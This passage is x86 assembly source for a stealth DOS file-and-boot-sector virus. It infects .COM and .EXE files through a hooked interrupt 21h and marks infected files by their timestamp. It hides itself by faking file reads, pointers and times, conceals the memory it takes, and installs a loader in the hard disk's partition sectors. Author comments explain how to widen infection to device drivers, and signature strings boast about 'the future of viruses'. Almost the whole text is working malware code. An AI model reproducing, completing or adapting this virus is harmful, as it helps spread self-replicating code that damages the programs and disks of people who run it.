;       scasw                                                                   ;compare second half of suffix
;       xchg    bx,ax                                                           ;swap second half of suffix with first half
;       db      0beh                                                            ;dummy operation to mask inc and inc

skip_suffix:
;       inc     di                                                              ;skip 1 byte in destination
;       inc     di                                                              ;skip 1 byte in destination

loop_suffix:
;       loopnz  scan_suffix                                                     ;branch if no match but suffices remain
;       pop     es                                                              ;restore ES from stack

;                      alternate suffix comparison ends

return_suffix:
        lahf                                                                    ;store result in AH
        and     ah,suffix_flag                                                  ;strip off all but result flag
        mov     bx,offset toggle_byte-offset begin                              ;area to store toggle data
        or      byte ptr cs:[bx],suffix_flag                                    ;store suffix type in toggle
        xor     byte ptr cs:[bx],ah                                             ;update suffix type in toggle
                                                                                ;(clear if executable, set if not)
        ret                                                                     ;return from subroutine

;                   alternate suffix comparison list here

suffix_list:
;       db      0eh,"COM"
;       db      0eh,"BIN"
;       db      0eh,"OVL"

create_cont:
        mov     al,byte ptr cs:[bx]                                             ;get suffix type
        and     al,suffix_flag                                                  ;strip off all but suffix flag

;                   the following is a self-modifying line,
;              in case you've set a new bit-value for closef_flag

temp    =       0
rept    6
temp    =       temp+1
ife     (suffix_flag shr temp)-closef_flag
        exitm
endif
endm

        shr     al,temp                                                         ;convert to close flag
        or      byte ptr cs:[bx],closef_flag                                    ;store close flag in toggle
        xor     byte ptr cs:[bx],al                                             ;update close flag in toggle
                                                                                ;(set if executable, clear if not)
        popa                                                                    ;restore all registers from stack
        pop     es                                                              ;restore ES from stack
        pop     dx                                                              ;restore DX from stack
        push    ax                                                              ;save AX on stack
        call    call_21h                                                        ;create file
        jb      extend_ret                                                      ;branch if error
        xchg    bx,ax                                                           ;move handle number into BX
        push    cx                                                              ;save CX on stack
        push    dx                                                              ;save DX on stack
        push    offset extend_cont-offset begin                                 ;save offset on stack
                                                                                ;(simulate subroutine call)
check_seconds:
        mov     ax,5700h                                                        ;subfunction to retrieve file date and time
        call    call_21h                                                        ;retrieve file date and time
        mov     ax,cx                                                           ;move seconds into AX
        or      cl,1fh                                                          ;set entire seconds field
        dec     cx                                                              ;set 60 seconds
        xor     al,cl                                                           ;check for 60 seconds
        ret                                                                     ;return from subroutine

extend_cont:
        pop     dx                                                              ;restore DX from stack
        pop     cx                                                              ;restore CX from stack
        xchg    bx,ax                                                           ;move handle number into AX
        jz      extend_ret                                                      ;branch if file is already infected
        mov     byte ptr cs:[offset file_handle-offset begin],al                ;specify file is to be infected

extend_ret:
        pop     bx                                                              ;discard 2 bytes from stack
        jb      extend_error                                                    ;branch if error
        pop     bx                                                              ;restore BX from stack
        retf    2                                                               ;return from interrupt with flags set

extend_error:
        xchg    bx,ax                                                           ;move operation into AX
        pop     bx                                                              ;restore BX from stack

no_infect:
        jmp     jfar_21h                                                        ;branch to original interrupt 21h handler

debug_jmp:
        jmp     debug_ret                                                       ;branch to return from operation

check_infect:
        cmp     al,2                                                            ;reserved...
        jz      no_infect
        cmp     al,3                                                            ;load overlay...
        ja      no_infect

        pusha                           ;windows
        mov     ax,160ah                ;executing
        int     2fh                     ;test.
        or      ax,ax                   ;(hopefully)
        popa                            ;only
        jz      no_infect               ;temporary.

        or      al,al                                                           ;check requested operation
        jnz     debug_load                                                      ;branch if load only or load overlay

;        to infect device drivers (because they are loaded with 4B03h),
;               move the following line above the OR AL,AL line.
;          if you don't support device drivers, do NOT move the line
;          otherwise, device drivers will be infected as .COM files.

        call    check_environ                                                   ;infect file
        push    es                                                              ;save ES on stack
        push    bx                                                              ;save BX on stack
        push    ds                                                              ;save DS on stack
        push    cx                                                              ;save CX on stack
        push    si                                                              ;save SI on stack
        push    di                                                              ;save DI on stack
        push    es                                                              ;save parameter block segment on stack
        pop     ds                                                              ;restore parameter block segment from stack
        push    cs                                                              ;save code segment on stack
        pop     es                                                              ;restore code segment from stack
        inc     ax                                                              ;set operation to load only
        mov     cx,7                                                            ;parameter block byte-count
        mov     si,bx                                                           ;move offset of parameter block into SI
        mov     bx,offset header_buffer-offset begin+0ah                        ;area to store parameter block
        mov     di,bx                                                           ;move offset of area into DI
        repz    movsw                                                           ;save parameter block
        pop     di                                                              ;restore DI from stack
        pop     si                                                              ;restore SI from stack
        pop     cx                                                              ;restore CX from stack
        pop     ds                                                              ;restore DS from stack
        pushf                                                                   ;save flags on stack
        push    cs                                                              ;save code segment on stack
        push    offset spawn_cont-offset begin                                  ;save offset on stack
                                                                                ;(simulate interrupt call)
debug_load:
        mov     byte ptr cs:[offset scratch_area-offset begin+8],al             ;save requested operation
        push    bx                                                              ;save BX on stack
        push    dx                                                              ;save DX on stack
        call    call_21h                                                        ;load file
        pop     dx                                                              ;restore DX from stack
        pop     bx                                                              ;restore DX from stack
        jb      debug_jmp                                                       ;branch if error
        push    es                                                              ;save ES on stack
        push    ds                                                              ;save DS on stack
        pusha                                                                   ;save all registers on stack
        push    bx                                                              ;save BX on stack
        mov     ax,3d00h                                                        ;subfunction to open file
        call    call_21h                                                        ;open file for read only
        xchg    bx,ax                                                           ;move handle number into BX
        call    check_seconds                                                   ;check if file already infected
        pushf                                                                   ;save result on stack
        call    read_header                                                     ;read first 18h bytes
        mov     ah,3eh                                                          ;subfunction to close file
        call    call_21h                                                        ;close file
        mov     bp,dx                                                           ;area containing original header
        popf                                                                    ;retrieve infection result from stack
        pop     bx                                                              ;restore BX from stack
        jnz     okay_debug                                                      ;branch if file is not infected
        mov     ds,word ptr es:[bx]                                             ;get destination segment
        xor     di,di                                                           ;set destination offset to 0
        cmp     byte ptr cs:[bp+offset scratch_area-offset header_buffer+8],3   ;check requested operation

org     $-1                                                                     ;hard-coded fixup for previous operation
        pushf                                                                   ;save result on stack
        jz      test_debug                                                      ;branch if load overlay
        lds     di,dword ptr es:[bx+12h]                                        ;retrieve address of child process

test_debug:
        lea     si,word ptr [di+offset exe_buffer-offset begin+3]               ;offset of original .EXE code
        cmp     byte ptr cs:[bp],0e9h                                           ;check file type
        jnz     debug_exe                                                       ;branch if .EXE file
        popf                                                                    ;discard 2 bytes from stack
        add     si,word ptr ds:[di+1]                                           ;offset of original .COM code
        push    ds                                                              ;save initial code segment on stack
        pop     es                                                              ;restore initial code segment from stack
        movsb
        movsw                                                                   ;restore original 3 bytes of .COM file
        sub     si,offset exe_buffer-offset begin+3                             ;offset of viral code
        push    si                                                              ;save viral code offset on stack
        jmp     short clear_area                                                ;branch to clear memory of code

debug_exe:
        popf                                                                    ;restore requested operation result from stack
        jnz     disinf_exe                                                      ;branch if not load overlay
        mov     ax,ds                                                           ;move DS into AX
        add     ax,word ptr cs:[bp+16h]                                         ;add initial CS
        mov     es,ax                                                           ;move destination segment into ES
        push    word ptr cs:[bp+14h]                                            ;save initial IP on stack
        jmp     short clear_area                                                ;branch to clear memory of code

disinf_exe:
        add     si,0bh                                                          ;point to original file header
        lea     di,word ptr [bx+0eh]                                            ;offset of end of original parameter block
        call    get_psp                                                         ;retrieve PSP segment
        add     bx,10h                                                          ;point to first allocated segment
        lodsw                                                                   ;retrieve stack segment
        add     ax,bx                                                           ;relocate for actual memory segment
        push    ax                                                              ;save stack segment on stack
        movsw                                                                   ;store stack pointer in parameter block
        pop     ax                                                              ;restore stack segment from stack
        stosw                                                                   ;save stack segment in parameter block
        lodsw                                                                   ;skip checksum (waste of 2 bytes!)
        push    word ptr es:[di]                                                ;save instruction pointer on stack
        movsw                                                                   ;store instruction pointer in parameter block
        lodsw                                                                   ;retrieve code segment
        add     ax,bx                                                           ;relocate for actual memory segment
        stosw                                                                   ;store code segment in parameter block
        push    ds                                                              ;save initial code segment on stack
        pop     es                                                              ;restore initial code segment from stack

clear_area:
        xor     ax,ax                                                           ;set store byte to 0
        mov     cx,code_word_c                                                  ;number of words to clear
        pop     di                                                              ;restore viral code offset from stack
        repz    stosw                                                           ;clear viral code from host file in memory

okay_debug:
        cmp     byte ptr cs:[bp+offset scratch_area-offset header_buffer+8],3   ;check requested operation

org     $-1                                                                     ;hard-coded fixup for previous operation
        popa                                                                    ;restore all registers from stack
        pop     ds                                                              ;restore DS from stack
        jz      skip_psp                                                        ;branch if load overlay
        push    ds                                                              ;save DS on stack
        pusha                                                                   ;save all registers on stack
        call    test_int12h                                                     ;check if interrupt 12h already hooked
        popa                                                                    ;restore all registers from stack
        mov     dx,ds                                                           ;move DS into DX
        pop     ds                                                              ;restore DS from stack

skip_psp:
        pop     es                                                              ;restore ES from stack

debug_ret:
        retf    2                                                               ;return from interrupt with flags set

spawn_cont:
        pop     bx                                                              ;restore BX from stack
        pop     es                                                              ;restore ES from stack
        jb      debug_ret                                                       ;branch if error
        mov     bp,sp                                                           ;point to current top of stack
        lds     si,dword ptr ss:[bp+6]                                          ;retrieve termination address
        mov     es,dx                                                           ;move DX into ES

set_terminate:
        mov     ax,offset terminate-offset begin                                ;offset of new termination handler
        mov     di,0ah                                                          ;offset of termination address in PSP
        stosw                                                                   ;store new termination handler offset
        mov     ax,cs                                                           ;segment of new termination handler
        stosw                                                                   ;store new termination handler segment
        mov     di,offset process_no-offset begin                               ;area containing process information
        add     word ptr cs:[di],4                                              ;specify new process is spawning
        add     di,word ptr cs:[di]                                             ;retrieve process number
        mov     word ptr cs:[di+offset process_off-offset process_no-4],si      ;save old offset

org     $-1                                                                     ;hard-coded fixup for previous operation
        mov     word ptr cs:[di+offset process_seg-offset process_no-4],ds      ;save old code segment

org     $-2                                                                     ;hard-coded fixup for previous operation
        push    es                                                              ;save DS on stack
        pop     ds                                                              ;restore ES from stack
        mov     ax,4b00h                                                        ;set operation to execute
        iret                                                                    ;return from interrupt

do_infect:
        push    offset jfar_21h-offset begin                                    ;save return address on stack
                                                                                ;(simulate subroutine call)
;infecting on close instead of open requires more code to set read/write mode!

check_environ:
        push    ds                                                              ;save DS on stack
        push    es                                                              ;save ES on stack
        pusha                                                                   ;save all registers on stack
        push    ds                                                              ;save DS on stack
        pop     es                                                              ;restore ES from stack
        push    ax                                                              ;save AX on stack
        call    get_suffix                                                      ;get file suffix
        pop     ax                                                              ;restore AX from stack
        cmp     ah,4bh                                                          ;check requested operation
        jnz     skip_flag                                                       ;branch if not load
        and     byte ptr cs:[bx],0ffh-suffix_flag                               ;specify file to be infected
                                                                                ;(any file that is executed is fair game!)
skip_flag:
        push    offset attrib_cont-offset begin                                 ;save offset on stack
                                                                                ;(simulate subroutine call)
hook_24h:
        mov     ax,offset new_24h-offset begin                                  ;offset of new interrupt 24h handler
        db      38h                                                             ;dummy operation to mask move

restore_24h:
        mov     ax,4d47h                                                        ;offset of original interrupt 24h handler
                                                                                ;(the value here is altered as required)
        push    0                                                               ;save 0 on stack
        pop     ds                                                              ;set DS to 0
        mov     si,90h                                                          ;offset of interrupt 24h in interrupt table
        xchg    ax,word ptr ds:[si]                                             ;exchange old offset with new offset
        mov     word ptr cs:[offset restore_24h-offset begin+1],ax              ;save old interrupt 24h offset
        lodsw                                                                   ;skip 2 bytes in source
        mov     ax,word ptr ds:[si]                                             ;retrieve old interrupt 24h segment
        xchg    ax,word ptr cs:[offset old21h_code-offset begin+3]              ;exchange old segment with new segment
        mov     word ptr ds:[si],ax                                             ;save old interrupt 24h segment
        ret                                                                     ;return from subroutine

attrib_cont:
        push    es                                                              ;save ES on stack
        pop     ds                                                              ;restore DS from stack
        mov     ax,3d00h                                                        ;subfunction to open file
        call    call_21h                                                        ;open file
        jb      bad_op                                                          ;branch if error
        xchg    bx,ax                                                           ;move handle number into BX
        call    check_seconds                                                   ;check if file already infected
        jz      bad_rd                                                          ;branch if file is already infected
        push    cx                                                              ;save file time on stack
        push    dx                                                              ;save file date on stack
        call    infect                                                          ;infect file
        pop     dx                                                              ;restore file date from stack
        pop     cx                                                              ;restore file time from stack
        jb      bad_rd                                                          ;branch if error
        mov     ax,5701h                                                        ;subfunction to set file date and time
        call    call_21h                                                        ;set file date and time

bad_rd: mov     ah,3eh                                                          ;subfunction to close file
        call    call_21h                                                        ;close file

bad_op: call    restore_24h                                                     ;restore interrupt 24h
        popa                                                                    ;restore all registers from stack
        pop     es                                                              ;restore ES from stack
        pop     ds                                                              ;restore DS from stack
        ret                                                                     ;return from subroutine

new_24h:mov     al,3                                                            ;abort on critical error (for interrupt 24h)
        iret                                                                    ;return from interrupt

infect: mov     ax,1220h                                                        ;subfunction to get address of JFT
        int     2fh                                                             ;get address of JFT
        mov     ax,1216h                                                        ;subfunction to get address of SFT
        push    bx                                                              ;save handle number on stack
        mov     bl,byte ptr es:[di]                                             ;get SFT number
        int     2fh                                                             ;get address of SFT
        pop     bx                                                              ;restore handle number from stack
        or      byte ptr es:[di+5],bh                                           ;check device information

;this is fairly safe - if handle is greater than 255, the following will happen:

;             if it's a device, the redirection might be altered,
;              that's okay because it will be closed immediately

;            if it's a file, the drive might be altered... too bad
;              that's okay too - get a read error, close the file

        js      sml_file                                                        ;branch if device (CON, PRN, etc)

; this check is required because devices can be opened and closed like files!
;               (and a read of CON is a wait for keyboard input)

        or      byte ptr es:[di+2],2                                            ;set open mode to read/write in SFT
        push    offset infect_cont-offset begin                                 ;save return address on stack

read_header:
        push    cs                                                              ;save code segment on stack
        pop     ds                                                              ;restore code segment from stack
        mov     ah,3fh                                                          ;subfunction to read from file
        mov     cx,18h                                                          ;number of bytes in header
        mov     dx,offset header_buffer-offset begin                            ;offset of original header
        jmp     call_21h                                                        ;read .EXE header

infect_cont:
        xor     ax,cx                                                           ;ensure all bytes read
        jnz     sml_file                                                        ;branch if error or file smaller than 18h bytes
                                                                                ;(no INT 20h files - that'll help prevent isolation!)
        push    ds                                                              ;save code segment on stack
        pop     es                                                              ;restore code segment from stack
        mov     si,dx                                                           ;move offset of original buffer into SI
        mov     di,offset exe_buffer-offset begin                               ;offset of area to store original header
        repz    movsb                                                           ;save header
        mov     di,dx                                                           ;move offset of original buffer into DI
        mov     ax,4d5ah                                                        ;set initial header ID to 'ZM'
        cmp     ax,word ptr ds:[di]                                             ;check contents of header
        xchg    ah,al                                                           ;switch to 'MZ'
        jz      save_type                                                       ;branch if header contains 'ZM'
        cmp     ax,word ptr ds:[di]                                             ;check if header contains 'MZ'

save_type:
        pushf                                                                   ;save file type result on stack
        jz      save_exe                                                        ;branch if not .EXE file
        test    byte ptr ds:[offset toggle_byte-offset begin],suffix_flag       ;check suffix flag
        jnz     not_exe                                                         ;branch if not executable suffix

save_exe:
        mov     word ptr ds:[di],ax                                             ;save 'MZ' in header

find_eof:
        cwd                                                                     ;set low file pointer position to 0
        call    set_efp                                                         ;retrieve file size
        mov     word ptr ds:[di+offset scratch_area-offset header_buffer],ax    ;save low file size

org     $-1                                                                     ;hard-coded fixup for previous operation
        mov     word ptr ds:[di+offset scratch_area-offset header_buffer+2],dx  ;save high file size

org     $-1                                                                     ;hard-coded fixup for previous operation
        popf                                                                    ;restore file type result from stack
        pushf                                                                   ;save file type result on stack
        jz      overlay_check                                                   ;branch if .EXE file
        cmp     ax,com_byte_c+1                                                 ;check size of file + virus
        jnb     not_exe                                                         ;branch if maximum file size exceeded
        mov     byte ptr ds:[di],0e9h                                           ;save initial jump in file
        sub     ax,3                                                            ;calculate offset of viral code in file
        mov     word ptr ds:[di+1],ax                                           ;store offset of jump to viral code in file
        jmp     short ok_com                                                    ;branch to write viral code

not_exe:popf                                                                    ;discard 2 bytes from stack

sml_file:
        stc                                                                     ;specify error occurred
        ret                                                                     ;return from subroutine

overlay_check:
        cmp     word ptr ds:[di+0ch],cx                                         ;check value of maxalloc
        jz      not_exe                                                         ;branch if load to top of memory
                                                                                ;(I cannot justify the code size increase to support this)
        mov     ch,2                                                            ;set divisor to 200h
        div     cx                                                              ;calculate number of 512-byte pages
        or      dx,dx                                                           ;check last page size
        jz      skip_page                                                       ;branch if 512-byte aligned
        inc     ax                                                              ;add last page to count

skip_page:
        cmp     ax,word ptr ds:[di+4]                                           ;check high file size
        jnz     not_exe                                                         ;branch if file contains overlay data
        cmp     dx,word ptr ds:[di+2]                                           ;check low file size
        jnz     not_exe                                                         ;branch if file contains overlay data
        cwd                                                                     ;zero DX
        mov     ax,word ptr ds:[di+offset scratch_area-offset header_buffer]    ;retrieve low file size

org     $-1                                                                     ;hard-coded fixup for previous operation
        add     ax,code_byte_c                                                  ;add code byte count
        adc     dx,word ptr ds:[di+offset scratch_area-offset header_buffer+2]  ;calculate new file size

org     $-1                                                                     ;hard-coded fixup for previous operation
        div     cx                                                              ;calculate number of 512-byte pages
        or      dx,dx                                                           ;check last page size
        jz      save_size                                                       ;branch if 512-byte page aligned
        inc     ax                                                              ;add last page to count

save_size:
        mov     word ptr ds:[di+2],dx                                           ;store number of bytes in last page
        mov     word ptr ds:[di+4],ax                                           ;store number of pages
        cwd                                                                     ;set write offset to 0

ok_com: mov     cx,code_byte_c                                                  ;number of bytes in viral code
        call    write_file                                                      ;write viral code
        push    offset write_cont-offset begin                                  ;save return address on stack

set_zfp:xor     cx,cx                                                           ;set high file pointer position to 0
        mov     dx,cx                                                           ;set low file pointer position to 0

set_fp: mov     ax,4200h                                                        ;subfunction to set file pointer
        db      38h                                                             ;dummy operation to mask move

set_efp:mov     ax,4202h                                                        ;subfunction to set file pointer
        jmp     call_21h                                                        ;set file pointer

write_cont:
        popf                                                                    ;restore file type result from stack
        jnz     write_header                                                    ;branch if .COM file
        les     ax,dword ptr ds:[di+offset scratch_area-offset header_buffer]   ;retrieve file size

org     $-1                                                                     ;hard-coded fixup for previous operation
        mov     dx,es                                                           ;move high file size into DX
        mov     cl,10h                                                          ;number of bytes in a paragraph
        div     cx                                                              ;convert header size from paragraphs to bytes
        sub     ax,word ptr ds:[di+8]                                           ;subtract header size from new file size
        mov     word ptr ds:[di+14h],dx                                         ;store new initial instruction pointer
        mov     word ptr ds:[di+16h],ax                                         ;store new inital code segment
        add     dx,stack_byte_c                                                 ;set stack pointer to end of viral code
        mov     word ptr ds:[di+0eh],ax                                         ;store new initial stack pointer
        mov     word ptr ds:[di+10h],dx                                         ;store new initial stack segment

write_header:
        mov     dx,di                                                           ;move address of header into DX

write_cx:
        mov     cx,18h                                                          ;number of bytes in header

write_file:
        mov     ah,40h                                                          ;subfunction to write file
        jmp     call_21h                                                        ;write new file header

do_close:
        cmp     bl,byte ptr cs:[offset file_handle-offset begin]                ;check which handle is terminating
                                                                                ;(if you require more than 254 handles, then you are greedy!)
        jnz     close_file                                                      ;branch if saved handle is not terminating

;                      no need to check the value of BX,
;           because device handles are detected in infection routine

        push    ds                                                              ;save DS on stack
        push    es                                                              ;save ES on stack
        pusha                                                                   ;save all registers on stack
        mov     si,offset toggle_byte-offset begin                              ;area to store toggle data
        mov     byte ptr cs:[si+offset file_handle-offset toggle_byte],bh       ;specify file is not to be infected
                                                                                ;(this is safe, provided the handle number is less than 1,280 )
org     $-1                                                                     ;hard-coded fixup for previous operation
        mov     al,byte ptr cs:[si]                                             ;retrieve suffix type
        and     al,closef_flag                                                  ;strip off all but close flag

;              the shift value used here is calculated previously

        shl     al,temp                                                         ;convert to suffix flag
        or      byte ptr cs:[si],suffix_flag                                    ;store suffix flag in toggle
        xor     byte ptr cs:[si],al                                             ;update suffix flag in toggle
                                                                                ;(clear if executable, set if not)
        call    hook_24h                                                        ;hook interrupt 24h
        call    set_zfp                                                         ;set file pointer to start of file
        call    infect                                                          ;infect file
        jb      ok_close                                                        ;branch if error
        mov     ax,5700h                                                        ;subfunction to retrieve file date and time
        call    call_21h                                                        ;retrieve file date and time
        inc     al                                                              ;subfuction to set file date and time
        or      cl,1fh                                                          ;set all seconds fields
        dec     cx                                                              ;set 60 seconds
        call    call_21h                                                        ;set file date and time

ok_close:
        call    restore_24h                                                     ;restore interrupt 24h
        popa                                                                    ;restore all registers from stack
        pop     es                                                              ;restore ES from stack
        pop     ds                                                              ;restore DS from stack

close_file:
        jmp     jfar_21h                                                        ;close file
        db      "*4U2NV*"                                                       ;that is, unless you're reading this...

check_disinf:
        cmp     al,2                                                            ;check requestion operation
        jnz     close_file                                                      ;branch if not set from end of file

do_disinf:
        pusha                                                                   ;save all registers on stack
        call    check_seconds                                                   ;check if file already infected
        popa                                                                    ;restore all registers from stack
        jnz     close_file                                                      ;branch if file is not infected
        cmp     ah,42h                                                          ;check requested operation
        jnz     read_or_write                                                   ;branch if not set file pointer
        push    cx                                                              ;save high file pointer position on stack
        sub     dx,code_byte_c                                                  ;hide viral code size from file pointer
        sbb     cx,0                                                            ;allow for page shift
        call    call_21h                                                        ;set file pointer into original host file
        pop     cx                                                              ;restore high file pointer position from stack
        retf    2                                                               ;return from interrupt with flags set

read_or_write:
        pusha                                                                   ;save all registers on stack
        push    ds                                                              ;save segment of buffer on stack
        push    dx                                                              ;save offset of buffer on stack
        push    cs                                                              ;save code segment on stack
        pop     ds                                                              ;restore code segment from stack
        mov     ax,4201h                                                        ;subfunction to retrieve file pointer
        xor     cx,cx                                                           ;set high file pointer position to 0
        cwd                                                                     ;set low file pointer position to 0
        call    call_21h                                                        ;retrieve current file pointer position
        mov     si,offset scratch_area-offset begin                             ;offset of scratch area
        mov     word ptr ds:[si],ax                                             ;save low file pointer position
        mov     word ptr ds:[si+2],dx                                           ;save high file pointer position
        dec     cx                                                              ;set high file pointer position to -1
        mov     dx,0-code_byte_c                                                ;set low file pointer position to end of host
        call    set_efp                                                         ;retrieve original host file size
        mov     word ptr ds:[si+4],ax                                           ;save low file pointer position
        mov     word ptr ds:[si+6],dx                                           ;save high file pointer position
        mov     bp,sp                                                           ;point to current top of stack
        cmp     byte ptr ss:[bp+13h],3fh                                        ;check requested operation
        jz      read_file                                                       ;branch if read
        mov     dx,offset exe_buffer-offset code_end                            ;point to original header in viral code
        call    set_efp                                                         ;set file pointer to original host header
        call    read_header                                                     ;read bytes
        push    dx                                                              ;save buffer address on stack
        call    set_zfp                                                         ;set file pointer position to start of file
        pop     dx                                                              ;restore buffer address from stack
        call    write_cx                                                        ;write original header
        mov     cx,word ptr ds:[si+6]                                           ;restore high file pointer position
        mov     dx,word ptr ds:[si+4]                                           ;restore low file pointer position
        call    set_fp                                                          ;set file pointer position to original host end
        xor     cx,cx                                                           ;number of bytes to write
        call    write_file                                                      ;truncate file (set to original length)
        jb      disinf_fp                                                       ;branch if error
        mov     byte ptr ds:[si+offset file_handle-offset scratch_area],bl      ;specify file is to be infected when closed

org     $-1                                                                     ;hard-coded fixup for previous operation
        or      byte ptr ds:[si+offset toggle_byte-offset scratch_area],closef_flag
                                                                                ;store close flag in toggle
org     $-1                                                                     ;hard-coded fixup for previous operation

disinf_fp:
        mov     cx,word ptr ds:[si+2]                                           ;restore high file pointer position
        mov     dx,word ptr ds:[si]                                             ;restore low file pointer position
        call    set_fp                                                          ;set file pointer position to initial position
        pop     ds                                                              ;discard 2 bytes from stack
        pop     ds                                                              ;restore segment of buffer from stack
        popa                                                                    ;restore all registers from stack
        jmp     jfar_21h                                                        ;proceed with write operation

read_file:
        inc     cx                                                              ;set CX to 0
        cmp     cx,word ptr ds:[si+2]                                           ;check high file pointer position
        jnz     not_header                                                      ;branch if high file pointer position > 64k
        mov     ax,18h                                                          ;bytes in header
        sub     ax,word ptr ds:[si]                                             ;allow for current file pointer position
        ja      save_head                                                       ;branch if header bytes to be read

not_header:
        xchg    cx,ax                                                           ;set header byte-count to 0

save_head:
        mov     cx,word ptr ss:[bp+10h]                                         ;retrieve requested byte-count
        cmp     cx,ax                                                           ;compare with maximum header byte-count
        jnb     save_rest                                                       ;branch if requested count is larger
        mov     ax,cx                                                           ;set header byte-count to requested byte-count

save_rest:
        sub     cx,ax                                                           ;calculate requested byte-count without header
        push    cx                                                              ;save requested byte-count on stack
        push    ax                                                              ;save header byte-count on stack
        mov     cx,0ffffh                                                       ;set high file pointer position to -1
        mov     dx,offset exe_buffer-offset code_end                            ;set low file pointer position to start of original header
        add     dx,word ptr ds:[si]                                             ;use current position as index into original header
        call    set_efp                                                         ;set file pointer position
        lds     dx,dword ptr ss:[bp]                                            ;retrieve buffer address
        mov     ah,3fh                                                          ;subfunction to read file
        pop     cx                                                              ;restore header byte-count
        call    call_21h                                                        ;read bytes
        push    cs                                                              ;save code segment on stack
        pop     ds                                                              ;restore code segment from stack
        mov     word ptr ds:[si+8],ax                                           ;save read byte-count
        add     dx,ax                                                           ;update buffer offset with read byte-count
        push    dx                                                              ;save buffer offset on stack
        add     word ptr ds:[si],ax                                             ;retrieve low file pointer position
        mov     dx,word ptr ds:[si]                                             ;retrieve low file pointer position
        mov     cx,word ptr ds:[si+2]                                           ;retrieve high file pointer position
        call    set_fp                                                          ;set initial file pointer position
        cmp     dx,word ptr ds:[si+6]                                           ;check high file pointer position
        jb      add_request                                                     ;branch if within original file size
        ja      quit_disinf                                                     ;branch if exceeding original file size
        cmp     ax,word ptr ds:[si+4]                                           ;check low file pointer position
        jnb     quit_disinf                                                     ;branch if exceeding original file size

add_request:
        pop     bp                                                              ;restore buffer offset from stack
        pop     cx                                                              ;restore requested byte-count from stack
        add     ax,cx                                                           ;update low file pointer position
        adc     dx,0                                                            ;update high file pointer position
        cmp     dx,word ptr ds:[si+6]                                           ;check high file pointer position
        jb      read_rest                                                       ;branch if within original file size
        ja      wb_eof                                                          ;branch if exceeding original file size
        cmp     ax,word ptr ds:[si+4]                                           ;check low file pointer position
        jbe     read_rest                                                       ;branch if within original file size

wb_eof: mov     ax,word ptr ds:[si+4]                                           ;retrieve low original file size
        mov     dx,word ptr ds:[si+6]                                           ;retrieve high original file size
        sub     ax,word ptr ds:[si]                                             ;calculate low file overlap
        sbb     dx,word ptr ds:[si+2]                                           ;calculate high file overlap
        xchg    cx,ax                                                           ;move read count into CX
        jz      read_rest                                                       ;branch if within 64k
        mov     cx,word ptr ds:[si+8]                                           ;retrieve read byte-count
        not     cx                                                              ;subtract read byte-count from 64k

read_rest:
        pop     ds                                                              ;discard 2 bytes from stack
        pop     ds                                                              ;restore buffer segment from stack
        mov     ah,3fh                                                          ;subfunction to read file
        mov     dx,bp                                                           ;move buffer offset into DX
        call    call_21h                                                        ;read file
        add     word ptr cs:[si+8],ax                                           ;update read byte-count
        db      0f6h                                                            ;dummy operation to mask add and pop

quit_disinf:
        add     sp,6                                                            ;discard 6 bytes from stack
        pop     ds                                                              ;restore buffer segment from stack

set_count:
        popa                                                                    ;restore all registers from stack
        mov     ax,word ptr cs:[offset scratch_area-offset begin+8]             ;retrieve total count of bytes read
        retf    2                                                               ;return from interrupt with flags set

fix_time:
        pusha                                                                   ;save all registers on stack
        call    check_seconds                                                   ;check if file already infected
        popa                                                                    ;restore all registers from stack
        jz      check_time                                                      ;branch if file is infected
        jmp     jfar_21h                                                        ;proceed with time operation

check_time:
        or      al,al                                                           ;check requested operation
        jnz     set_time                                                        ;branch if operation is set time
        call    call_21h                                                        ;retrieve time
        and     cl,0e0h                                                         ;return 0 seconds if infected

quit_get:
        retf    2                                                               ;return from interrupt with flags set

set_time:
        push    cx                                                              ;save file time on stack
        or      cl,1fh                                                          ;set all seconds fields
        dec     cx                                                              ;set 60 seconds
        call    call_21h                                                        ;set time
        pop     cx                                                              ;restore file time from stack
        retf    2                                                               ;return from interrupt with flags set

new_12h:push    ds                                                              ;save DS on stack
        push    0                                                               ;save 0 on stack
        pop     ds                                                              ;set DS to 0
        mov     ax,word ptr ds:[413h]                                           ;retrieve current memory size
        pop     ds                                                              ;restore DS from stack
        add     ax,code_kilo_c                                                  ;restore top of system memory value
        iret                                                                    ;return from interrupt
        db      "13/05/94"                                                      ;welcome to the future of viruses

new_2fh:cmp     ax,1607h                                                        ;virtual device call out api...
        jnz     jfar_2fh
        cmp     bx,10h                                                          ;virtual hard disk device...
        jnz     jfar_2fh
        cmp     cx,3                                                            ;installation check...
        jnz     jfar_2fh
        xor     cx,cx                                                           ;prevents windows message
                                                                                ;"cannot load 32-bit disk driver"
        iret                                                                    ;return from interrupt

jfar_2fh:
        db      0eah                                                            ;jump xxxx:xxxx
        dd      0                                                               ;original interrupt 2fh here

exe_buffer:
        int     20h                                                             ;terminate first generation code
        db      0
        db      15h dup (0)                                                     ;this area contains the original header

newp_loader:
        xor     bx,bx                                                           ;zero BX
        mov     ss,bx                                                           ;set stack segment
        mov     sp,7c00h                                                        ;set stack pointer

;                  zeroing DS here will save 1 byte of code,
;                 but require an additional 1 byte of storage

        sub     word ptr cs:[413h],code_kilo_c                                  ;reduce size of total system memory

org     $-1                                                                     ;hard-coded fixup for previous operation
        int     12h                                                             ;allocate memory at top of system memory
        shl     ax,6                                                            ;convert kilobyte count to memory segment
        mov     es,ax                                                           ;retrieve segment of new top of system memory
        mov     ax,code_sect_c+200h                                             ;number of sectors in code
        mov     cx,2                                                            ;cylinder 0, sector 2
        mov     dx,80h                                                          ;of hard disk
        int     13h                                                             ;read viral code sectors to top of system memory
        push    es                                                              ;save top of system memory code segment on stack
        push    offset phook_interrupts-offset begin                            ;save top of system memory offset on stack
                                                                                ;(simulate far call)
        retf                                                                    ;return from far call
                                                                                ;(continue execution at top of system memory)
new_part:
        db      0,0,1,0,5,0,0b8h,0bh,1,0,0,0,0bch,1,0,0                         ;new active partition

phook_interrupts:
        xchg    bx,ax                                                           ;zero AX
        inc     ax                                                              ;specify code not loaded high
        mov     di,offset toggle_byte-offset begin                              ;area to clear
        stosw                                                                   ;interrupt 12h not yet hooked,
                                                                                ;interrupt 21h not executing
                                                                                ;(incidently zeroes file handle)
        dec     ax                                                              ;zero AX
        stosw                                                                   ;specify no programs currently executing
        mov     ds,ax                                                           ;set DS to 0
        mov     ax,offset new_8-offset begin                                    ;offset of new interrupt 8 handler
        mov     si,20h                                                          ;offset of interrupt 8 in interrupt table
        mov     di,offset jfar_21h-offset begin+1                               ;area to store original interrupt 8 address
        cli                                                                     ;disable interrupts

hook_part:
        xchg    ax,word ptr ds:[si]                                             ;exchange old offset with new offset
        stosw                                                                   ;save original offset
